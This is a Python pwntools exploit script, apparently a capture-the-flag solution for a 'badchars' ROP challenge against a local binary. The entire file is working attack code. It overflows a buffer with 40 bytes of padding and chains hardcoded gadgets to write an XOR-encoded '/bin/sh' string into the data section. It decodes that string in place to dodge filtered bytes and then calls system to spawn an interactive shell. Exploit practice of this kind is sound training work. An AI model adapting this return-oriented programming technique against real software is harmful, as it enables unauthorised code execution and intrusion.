from pwn import *
context.log_level = 'debug'

p="./elf"

context.binary=p
io=process(p)

badchars=[0x62, 0x69, 0x63, 0x2f, 0x20, 0x66, 0x6e, 0x73]
pop_r12_r13=0x0000000000400b3b
mov_r12_r13=0x0000000000400b34
data_addr=0x0000000000601070
xor_r14_r15=0x0000000000400b30 
pop_r14_r15=0x0000000000400b40
patchbyte=0x1
pop_rdi=0x0000000000400b39
sys_plt=0x00000000004006F0

while(1):
    binsh=""
    for i in "/bin/sh\x00":
        c=ord(i)^patchbyte
        if c in badchars:
            patchbyte+=1
            break    
        else:
            binsh+=chr(c)
    if len(binsh)==8:
        break

payload="A"*40+p64(pop_r12_r13)+binsh+p64(data_addr)+p64(mov_r12_r13)

for i in range(len(binsh)):
    payload+=p64(pop_r14_r15)
    payload+=p64(patchbyte)
    payload+=p64(data_addr+i)
    payload+=p64(xor_r14_r15)

payload+=p64(pop_rdi)+p64(data_addr)+p64(sys_plt)

io.recvuntil("> ")
io.sendline(payload)

io.interactive()
